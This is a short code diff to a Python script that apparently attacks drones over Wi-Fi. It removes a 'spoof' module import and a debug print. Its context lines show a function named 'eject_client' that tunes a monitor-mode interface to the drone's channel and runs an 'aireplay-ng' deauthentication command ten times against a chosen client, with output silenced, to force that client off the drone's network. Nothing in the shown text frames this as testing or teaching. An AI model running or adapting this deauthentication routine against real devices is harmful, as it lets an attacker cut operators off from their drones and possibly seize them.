@@ -1,7 +1,7 @@
 
 import os, time, sys, csv ,re
 from scan_clients import *
-from spoof import *
+
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
 
@@ -47,7 +47,6 @@ def find_channel(mac_drone):
 def eject_client(client, mac_drone, drone_essid, iface_mon):
     channel = find_channel(mac_drone)
     os.system("sudo iwconfig {0} channel {1}".format(iface_mon, channel))
-    print("1"+mac_drone)
     cmd = "sudo aireplay-ng -0 1 -e {3} -a {0} -c {1} {2} >>/dev/null 2>>/dev/null".format(mac_drone, client.mac, iface_mon, drone_essid)
     for i in range(10):
         os.system(cmd)
